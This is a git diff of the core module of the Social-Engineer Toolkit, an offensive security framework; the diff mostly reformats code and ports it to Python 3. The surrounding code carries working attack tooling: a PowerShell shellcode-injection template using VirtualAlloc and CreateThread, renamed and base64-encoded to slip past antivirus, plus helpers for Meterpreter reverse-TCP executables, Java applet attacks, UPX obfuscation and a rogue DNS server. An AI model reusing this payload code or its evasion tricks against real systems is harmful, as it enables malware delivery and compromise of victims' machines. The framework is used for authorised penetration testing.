@@ -1,7 +1,7 @@
 #!/usr/bin/env python
-##############################################
-#    Centralized core modules for SET        #
-##############################################
+#
+# Centralized core modules for SET        #
+#
 import re
 import sys
 import socket
@@ -17,15 +17,18 @@ import base64
 from src.core import dictionaries
 import io
 import trace
-import urllib2
+from urllib import *
 
 if sys.version_info >= (3, 0):
     # python 3 removes reduce from builtin and into functools
     from functools import *
 
-# needed for backwards compatibility of python2 vs 3 - need to convert to threading eventually
-try: import thread
-except ImportError: import _thread as thread
+# needed for backwards compatibility of python2 vs 3 - need to convert to
+# threading eventually
+try:
+    import thread
+except ImportError:
+    import _thread as thread
 
 try:
     raw_input
@@ -38,10 +41,13 @@ try:
 
 except ImportError:
 
-    print("[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
+    print(
+        "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
     pass
 
 # get the main SET path
+
+
 def definepath():
     if check_os() == "posix":
         if os.path.isfile("setoolkit"):
@@ -167,7 +173,8 @@ def setprompt(category, text):
         if text == "":
             for level in category:
                 level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
+                prompt += ":" + bcolors.UNDERL + \
+                    bcolors.DARKCYAN + level + bcolors.ENDC
             promptstring = str(prompt)
             promptstring += ">"
             return promptstring
@@ -176,7 +183,8 @@ def setprompt(category, text):
             # iterate through the list received
             for level in category:
                 level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
+                prompt += ":" + bcolors.UNDERL + \
+                    bcolors.DARKCYAN + level + bcolors.ENDC
             promptstring = str(prompt)
             promptstring = promptstring + "> " + text + ":"
             return promptstring
@@ -203,7 +211,7 @@ def return_continue():
            "<return> " + bcolors.ENDC + "to continue"))
     pause = raw_input()
 
-############ DEBUGGING ###############
+# DEBUGGING ###############
 # ALWAYS SET TO ZERO BEFORE COMMIT!
 DEBUG_LEVEL = 0
 #  0 = Debugging OFF
@@ -235,8 +243,8 @@ def mod_name():
     calling_module = inspect.getmodulename(frame_records[1])
     return calling_module
 
-##########################################
-############ RUNTIME MESSAGES ############
+#
+# RUNTIME MESSAGES ############
 
 
 def print_status(message):
@@ -263,6 +271,7 @@ def print_error(message):
 def get_version():
     define_version = '7.2'
     return define_version
+
 
 class create_menu:
 
@@ -421,7 +430,8 @@ def grab_ipaddress():
                         # check if IP address is valid
                         ip_check = is_valid_ip(rhost)
                         if ip_check == False:
-                            rhost = raw_input("[!] Invalid ip address try again: ")
+                            rhost = raw_input(
+                                "[!] Invalid ip address try again: ")
                         if ip_check == True:
                             break
                     return rhost
@@ -605,17 +615,20 @@ def meterpreter_reverse_tcp_exe(port):
     # import the system path for payloadgen in SET
     sys.path.append("src/core/payloadgen")
     try:
-        debug_msg("setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
+        debug_msg(
+            "setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
         module_reload(create_payloads)
 
     except:
-        debug_msg("setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
+        debug_msg(
+            "setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
         import create_payloads
 
     random_value = generate_random_string(5, 10)
     # copy the created executable to program_junk
     print_status("Executable created under %s/%s.exe" % (setdir, random_value))
-    subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir, setdir, random_value),
+    subprocess.Popen(
+        "cp %s/msf.exe %s/%s.exe" % (setdir, setdir, random_value),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 #
 # Start a metasploit multi handler
@@ -720,7 +733,8 @@ def java_applet_attack(website, port, directory):
         applet_name = generate_random_string(6, 15) + ".jar"
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s/%s" % (setdir, directory, applet_name),
+    subprocess.Popen(
+        "cp %s/Signed_Update.jar %s/%s" % (setdir, directory, applet_name),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # start the web server by running it in the background
@@ -855,7 +869,8 @@ def upx(path_to_file):
         print_info(
             "Packing the executable and obfuscating PE file randomly, one moment.")
         # packing executable
-        subprocess.Popen("%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir, path_to_file),
+        subprocess.Popen(
+            "%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
         # move it over the old file
         subprocess.Popen("mv %s/temp.binary %s" % (setdir, path_to_file),
@@ -902,28 +917,33 @@ def show_banner(define_version, graphic):
 """ + bcolors.GREEN + """        Welcome to the Social-Engineer Toolkit (SET).
          The one stop shop for all of your SE needs.
 """)
-    print(bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC)
+    print(bcolors.BLUE +
+          """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC)
     print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ +
           bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
 
-
-    # here we check if  there is a new version of SET - if there is, then display a banner
+    # here we check if  there is a new version of SET - if there is, then
+    # display a banner
     cv = get_version()
 
     # pull version
-    try: 
-        response = urllib2.urlopen('https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/setcore.py')
+    try:
+        response = urlopen(
+            'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/setcore.py')
         setcheck = response.readlines()
         for line in setcheck:
             line = line.rstrip()
             if "define_version =" in line:
-		# define_version = '7.1.2'
-                version = line.replace("define_version = ", "").replace("'", "", 2).replace("    ", "")
-                   
+                # define_version = '7.1.2'
+                version = line.replace("define_version = ", "").replace(
+                    "'", "", 2).replace("    ", "")
+
         if cv != version:
-		print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN + "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)
+            print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN +
+                  "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)
     except Exception as err:
-	print err
+        print(err)
+
 
 def show_graphic():
     menu = random.randrange(2, 14)
@@ -1136,8 +1156,6 @@ def show_graphic():
                       ``:::::::::''""" + bcolors.ENDC)
 
 
-
-
 #
 # identify if set interactive shells are disabled
 #
@@ -1167,7 +1185,8 @@ def menu_back():
 def custom_template():
     try:
         print ("         [****]  Custom Template Generator [****]\n")
-        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
+        print (
+            "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author = raw_input(setprompt("0", "Enter the name of the author"))
         filename = randomgen = random.randrange(1, 99999999999999999999)
         filename = str(filename) + (".template")
@@ -1201,7 +1220,7 @@ def check_length(choice, max):
     while 1:
         if counter == 1:
             choice = raw_input(bcolors.YELLOW + bcolors.BOLD +
-                           "[!] " + bcolors.ENDC + "Invalid choice try again: ")
+                               "[!] " + bcolors.ENDC + "Invalid choice try again: ")
         # try block in case its not a integer
         try:
             # check to see if its an integer
@@ -1461,7 +1480,8 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     # where if it detects 64 bit it'll use x86 powershell. This is useful so
     # we don't have to guess if its x64 or x86 and what type of shellcode to
     # use
-    # added random vars before and after to change strings - AV you are seriously ridiculous.
+    # added random vars before and after to change strings - AV you are
+    # seriously ridiculous.
     var1 = generate_random_string(3, 4)
     var2 = generate_random_string(3, 4)
     var3 = generate_random_string(3, 4)
@@ -1474,12 +1494,15 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
         r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
 
     # run it through a lame var replace
-    powershell_command = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_command = powershell_code.replace("$1", "$" + var1).replace(
+        "$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
 
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
+
+
 def generate_shellcode(payload, ipaddr, port):
 
     msf_path = meta_path()
@@ -1490,13 +1513,17 @@ def generate_shellcode(payload, ipaddr, port):
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
-    #repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
+    # repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
     #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
-    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=', "b'", "'", '\\n']
-    for repl in repls: data = data.replace(repl, "")
+    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
+             'unsignedcharbuf[]=', "b'", "'", '\\n']
+    for repl in repls:
+        data = data.replace(repl, "")
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
+
+
 def shellcode_replace(ipaddr, port, shellcode):
     # split up the ip address
     ip = ipaddr.split('.')
@@ -1560,6 +1587,8 @@ def shellcode_replace(ipaddr, port, shellcode):
     return shellcode
 
 # exit routine
+
+
 def exit_set():
     cleanup_routine()
     print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
@@ -1605,6 +1634,8 @@ def metasploit_shellcode(payload, ipaddr, port):
 
 # here we encrypt via aes, will return encrypted string based on secret
 # key which is random
+
+
 def encryptAES(secret, data):
 
     # the character used for padding--with a block cipher such as AES, the value
@@ -1677,6 +1708,8 @@ class DNSQuery:
         return packet
 
 # main dns routine
+
+
 def dns():
     udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udps.bind(('', 53))
@@ -1692,10 +1725,14 @@ def dns():
         udps.close()
 
 # start dns
+
+
 def start_dns():
     thread.start_new_thread(dns, ())
 
 # the main ~./set path for SET
+
+
 def setdir():
     if check_os() == "posix":
         return os.path.join(os.path.expanduser('~'), '.set')
@@ -1825,16 +1862,21 @@ def get_sql_port(host):
         pass
 
 # this will manually tcp connect if needed
+
+
 def sql_nmap_scan(ipaddr):
-        proc = subprocess.Popen("nmap -v -sT -p1433 %s" % (ipaddr), shell=True, stdout=subprocess.PIPE)
-        output =  proc.communicate()[0].split("\n")
-        result = ""
-        for result in output:
-                if "Discovered open port" in result:
-                        result = result.split("on ")[1]
-	return result
+    proc = subprocess.Popen("nmap -v -sT -p1433 %s" %
+                            (ipaddr), shell=True, stdout=subprocess.PIPE)
+    output = proc.communicate()[0].split("\n")
+    result = ""
+    for result in output:
+        if "Discovered open port" in result:
+            result = result.split("on ")[1]
+    return result
 
 # capture output from a function
+
+
 def capture(func, *args, **kwargs):
     """Capture the output of func when called with the given arguments.
 
@@ -1886,6 +1928,8 @@ def check_kali():
         return "Non-Kali"
 
 # here we give multiple options to specify for SET java applet
+
+
 def applet_choice():
 
     # prompt here
@@ -1928,18 +1972,24 @@ Select which option you want:
             module_reload(src.html.unsigned.verified_sign)
 
 # reload module function for python 2 and python 3
+
+
 def module_reload(module):
-    if sys.version_info >= (3,0):
+    if sys.version_info >= (3, 0):
         import importlib
         importlib.reload(module)
     else:
         reload(module)
 
 # used to replace any input that we have from python 2 to python 3
+
+
 def input(string):
-	return raw_input(string)
+    return raw_input(string)
 
 # fetch URL needed for web cloning
+
+
 def fetch_template():
     fileopen = open(setdir + "/site.template").readlines()
     for line in fileopen:
@@ -1953,7 +2003,7 @@ def fetch_template():
 # tail a file
 def tail(filename):
     if os.path.isfile(filename):
-        file = open(filename,'r')
+        file = open(filename, 'r')
         st_results = os.stat(filename)
         st_size = st_results[6]
         file.seek(st_size)
@@ -1965,6 +2015,7 @@ def tail(filename):
                 time.sleep(1)
                 file.seek(where)
             else:
-                print(line,) # already has newline
+                print(line,)  # already has newline
 
-    else: print_error("File not found, cannot tail.")
+    else:
+        print_error("File not found, cannot tail.")
